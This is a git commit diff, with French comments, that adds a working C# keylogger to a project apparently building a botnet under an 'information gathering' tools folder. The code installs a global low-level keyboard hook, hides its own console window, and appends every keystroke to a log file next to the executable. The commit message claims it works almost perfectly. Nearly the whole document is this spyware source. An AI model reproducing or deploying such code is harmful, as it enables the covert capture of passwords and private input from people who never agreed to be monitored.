19b09c49b4941d843c159cbce6de5fe3a3c7356e
Erawlam19 <richiardi.paul@gmail.com>
2018-05-26 13:45:23 +0200

    Création KEYLOGGER
    IL FONCTIONNE PRESQUE PARFAITEMENT BIEN

--- BotNet/Botnet/tools/information gathering/KeyLogger.cs
+++ BotNet/Botnet/tools/information gathering/KeyLogger.cs
@@ -1,61 +1,81 @@
-﻿using System;
-using System.Collections.Generic;
-using System.Linq;
-using System.Text;
-using System.Threading.Tasks;
-using System.Runtime.InteropServices;
+﻿// Ajout des espaces de noms
+using System;
 using System.Diagnostics;
+using System.Windows.Forms;
+using System.Runtime.InteropServices;
 using System.IO;
-using System.Windows;
 
-namespace Botnet.tools
+// Classe pour interceper les frappes
+class InterceptKeys
 {
-    class KeyLogger
+    private const int WH_KEYBOARD_LL = 13;
+    private const int WM_KEYDOWN = 0x0100;
+    private static LowLevelKeyboardProc _proc = HookCallback;
+    private static IntPtr _hookID = IntPtr.Zero;
+
+    public static void mainkey()
     {
-        private static int WH_KEYBOAD_LL = 13;
-        private static int WM_KEYDOWN = 0x0100;
-        private static IntPtr hook = IntPtr.Zero;
-        private static LowLevelKeyboardProc llkProcedure = HookCallback;
+        var handle = GetConsoleWindow();
 
-        public void Run()
-        {
-            while(true)
-            {
-                hook = SetHook(llkProcedure);
-                UnhookWindowsHookEx(hook);
-            }
-            
-        }
+        // Partie pour cacher le bordel
+        ShowWindow(handle, SW_HIDE);
 
-        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
+        _hookID = SetHook(_proc);
+        Application.Run();
+        UnhookWindowsHookEx(_hookID);
 
-        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
-        {
-            if(nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
-            {
-                int vkCode = Marshal.ReadInt32(lParam);
-                Console.WriteLine(vkCode);
-            }
-            return CallNextHookEx(IntPtr.Zero, wParam, lParam);
-        }
-
-        private static IntPtr SetHook(LowLevelKeyboardProc proc)
-        {
-            Process currentProcess = Process.GetCurrentProcess();
-            ProcessModule currentModule = currentProcess.MainModule;
-            String moduleName = currentModule.ModuleName;
-            IntPtr moduleHandle = GetModuleHandle(moduleName);
-
-            return SetWindowsHookEx(WH_KEYBOAD_LL, llkProcedure, moduleHandle, 0);
-        }
-
-        [DllImport("user32.dll")]
-        private static extern IntPtr CallNextHookEx(IntPtr hhk, IntPtr wParam, IntPtr lParam);
-        [DllImport("user32.dll")]
-        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
-        [DllImport("user32.dll")]
-        private static extern bool UnhookWindowsHookEx(IntPtr hhk);
-        [DllImport("kernel32.dll")]
-        private static extern IntPtr GetModuleHandle(String lpModuleName);
     }
+
+    private static IntPtr SetHook(LowLevelKeyboardProc proc)
+    {
+        using (Process curProcess = Process.GetCurrentProcess())
+        using (ProcessModule curModule = curProcess.MainModule)
+        {
+            return SetWindowsHookEx(WH_KEYBOARD_LL, proc,
+                GetModuleHandle(curModule.ModuleName), 0);
+        }
+    }
+
+    private delegate IntPtr LowLevelKeyboardProc(
+        int nCode, IntPtr wParam, IntPtr lParam);
+
+    private static IntPtr HookCallback(
+        int nCode, IntPtr wParam, IntPtr lParam)
+    {
+        if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
+        {
+            int vkCode = Marshal.ReadInt32(lParam);
+            Console.WriteLine((Keys)vkCode);
+            StreamWriter sw = new StreamWriter(Application.StartupPath + @"\log.txt", true); // Toutes les frappes seront enregistrées dans le fichier log.txt à la racine du programme .exe
+            sw.Write((Keys)vkCode);
+            sw.Close();
+        }
+        return CallNextHookEx(_hookID, nCode, wParam, lParam);
+    }
+
+    // Ajout de DLL
+
+    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+    private static extern IntPtr SetWindowsHookEx(int idHook,
+        LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
+
+    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+    [return: MarshalAs(UnmanagedType.Bool)]
+    private static extern bool UnhookWindowsHookEx(IntPtr hhk);
+
+    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+    private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,
+        IntPtr wParam, IntPtr lParam);
+
+    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+    private static extern IntPtr GetModuleHandle(string lpModuleName);
+
+    [DllImport("kernel32.dll")]
+    static extern IntPtr GetConsoleWindow();
+
+    [DllImport("user32.dll")]
+    static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+
+    const int SW_HIDE = 0;
+
 }
